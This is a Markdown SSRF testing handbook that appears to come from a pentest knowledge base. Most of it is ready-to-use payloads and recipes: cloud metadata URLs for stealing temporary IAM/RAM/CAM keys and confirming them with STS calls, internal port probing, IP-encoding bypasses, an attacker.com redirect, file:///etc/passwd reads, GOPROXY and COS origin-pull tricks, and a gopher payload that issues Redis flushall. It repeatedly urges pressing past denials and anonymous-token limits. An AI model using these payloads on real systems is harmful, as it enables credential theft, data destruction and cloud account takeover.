> The short table uses the titles "Cloud Provider Metadata Path Differences" and "Public GOPROXY" for title-based search. English supplements/appendices have been cut; cloud metadata path differences and bypasses are still in the first half.

## I. Original Knowledge Base

# SSRF Testing Handbook

## Common Injection Points

```
Image/File URL parameters: imageUrl=, fileUrl=, url=, link=, targetUrl=
Preview/Load features: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF/Screenshot generation: pass in a URL to generate a screenshot
Model/Gateway proxy: path contains proxy, parameters are still targetUrl / url / callback
```

## Detection Payloads

### Verify Using DNSLog (no response/output)

```bash
# Request a dnslog domain: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

# Send the request
curl "https://target.com/api/preview?url=http://$DNSLOG/test"

# Check the dnslog platform for DNS query records
# If there's a record → SSRF exists
```

### Internal Network Probing (after confirming SSRF)

```bash
# Probe common internal IP ranges
for ip in 192.168.1.{1..254}; do
  echo "?url=http://$ip"
done

# Probe internal service ports
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:27017/  # MongoDB
?url=http://192.168.1.1:8080/   # Internal Web
?url=http://192.168.1.1:22/     # SSH (judge by response time)
```

### Cloud Service Metadata (key focus)

```bash
# AWS EC2 Metadata (severe risk, can obtain IAM credentials)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Domestic (Chinese) cloud ECS metadata
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

# GCP Metadata
?url=http://metadata.google.internal/computeMetadata/v1/

# Cloud providers (even if the directory works, you still need to fetch the keys, see "Cloud Provider Metadata Path Differences" below)
?url=http://vendor-metadata-domain/latest/meta-data/
?url=http://vendor-metadata-domain/latest/meta-data/cam/security-credentials/
?url=http://vendor-metadata-domain/latest/meta-data/cam/service-role-security-credentials/<ROLE>
?url=http://169.254.169.254/latest/meta-data/
```

### Cloud Provider Metadata Path Differences / Loopback Blocked but Metadata Not / Cloud Development Anonymous Proxy (short table has a pointer)

Identify: cloud provider metadata; or cloud development / HTTP gateway path containing `proxy`, with parameters `targetUrl` / `url` / `callback`; anonymous login (of the `signin/anonymously` kind) yields a token.

Exploit:

1. **Filter comparison.** First hit `http://127.0.0.1/`, then `http://vendor-metadata-domain/latest/meta-data/` and `http://169.254.169.254/latest/meta-data/`. A 403 on loopback, `Forbidden Loopback` ≠ metadata is also blocked. If it only blocks the loopback string and does not block the cloud metadata domain by resolved IP, keep going.
2. **Key path.** If the directory works, first read the role name (list under `cam/security-credentials/`). Then fetch the temporary keys: `cam/security-credentials/<role-name>` often returns 404, **you must also hit** `cam/service-role-security-credentials/<role-name>`. Stopping at the 404 following the AWS `iam/security-credentials/` recipe = missing the keys.
3. **Anonymous gateway as entry point.** A token obtained from an official demo environment or anonymous login should **not** be treated as "already logged in, within permissions." Use it to hit the `*proxy*` URL parameter. The same endpoint may be disabled in other environments, so switch environments and keep trying — don't treat one disabled instance as the whole product being secure.
4. **Open proxy with fixed POST.** Direct metadata hit returning 405 (IMDS only accepts GET) ≠ no vulnerability. First hit a public 302 (of the `redirect-to` kind) pointing Location at `http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>`, so the proxy switches to GET when following the redirect. Domestic cloud roles are listed under `ram/security-credentials/`. Use the key with STS GetCallerIdentity.

Success criteria: metadata body reflected, or obtained `TmpSecretId` / `TmpSecretKey` / `Token`, then use those three to call a cloud API (of the `GetCallerIdentity` kind) to match it to the main account. Don't stop at ListBuckets 403; also sign a CLS `DescribeConfigs` call to view collection configs/topics. Only reading instance-id, keys returning 404, or calls not working → not yet successful.

False positives: proxy only allows a model-vendor whitelist and metadata also 403; anonymous enabled but proxy closed to anonymous; keys belong to a narrow role and no proof of being able to call any cloud API (half finding, don't claim full account takeover). A single-site miss doesn't mean deleting this row from the short table.

This is not a duplicate of the generic "SSRF hitting `169.254.169.254`": this entry adds **vendor key path differences + loopback/metadata filter split + anonymous gateway as entry point**. Public GOPROXY is not a step for this gun, see the next section.

### Public GOPROXY (short table has a pointer)

Identify: public GOPROXY (`/go/`, module `/@v/list`) performs `?go-get=1` based on the module path then follows VCS. This is **NOT** the previous section's cloud development `*proxy*`.

Exploit (no login):

1. Set the module path to your own domain.  
2. Use **hg** for `go-import` on the page + `http://vendor-metadata-domain/...` (git HTTPS often times out).  
3. RFC1918 Forbidden ≠ metadata domain also blocked. If the directory works, keys go through `cam/service-role-security-credentials/<role>` (same as step 2 in the previous section).

Success criteria: hg error/reflecting metadata or temporary keys, then GetCallerIdentity to ask out the AccountId.

False positives: not GOPROXY / module path won't `go-get`; metadata domain also blocked (not just Forbidden RFC1918); hg doesn't follow either and no keys come out; keys don't work in calls. A single-site miss doesn't mean deleting this row from the short table.

## Bypass Techniques

```bash
# Bypass IP blacklist
http://127.0.0.1/    → http://2130706433/       # Decimal IP
                     → http://0177.0.0.1/        # Octal
                     → http://0x7f000001/         # Hexadecimal
                     → http://127.1/             # Shorthand

# Bypass localhost filtering
http://localhost/    → http://[::1]/             # IPv6
                     → http://127.0.0.1.xip.io/ # DNS resolves to 127

# Protocol switching
http://internal-host/ → file:///etc/passwd
                      → gopher://127.0.0.1:6379/_*1... (attack Redis)
                      → dict://127.0.0.1:6379/info

# URL redirect bypass
Set up a redirect service: http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### COS Origin-Pull Race Condition (only attack if origin-pull is seen)

Identify: the application fetches objects from COS/OSS, the bucket has "origin-pull if object doesn't exist" configured to a source you control; you can also PUT and DELETE the **same key**. Without origin-pull configured, don't bother attacking.

Exploit:

1. Point origin-pull at your site; on your source, 302 to metadata or the internal network.  
2. On the same key, simultaneously PUT (object present during detection, no origin-pull) and DELETE (object gone at real GET time → origin-pull follows the 302). For concurrency see `race-condition-test.md`.  
3. Check whether the application's download/import hits your source or the internal network.

Success criteria: the application side follows to the internal network/metadata (reflected, out-of-band, or present in import results). Only proving origin-pull can be configured, without hitting the internal network → not successful.

False positives: origin-pull doesn't follow 302; detection and download use same-moment caching; you can't control the origin-pull target. Not included in the short table (requires being able to configure origin-pull yourself, fairly narrow).

## Attacking Internal Services with the gopher Protocol

```bash
# Attack Redis (write webshell or scheduled task)
# gopher://127.0.0.1:6379/_RESP-encoded command
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# Tools to generate gopher payload
# gopherus: python gopherus.py --exploit redis
```

---
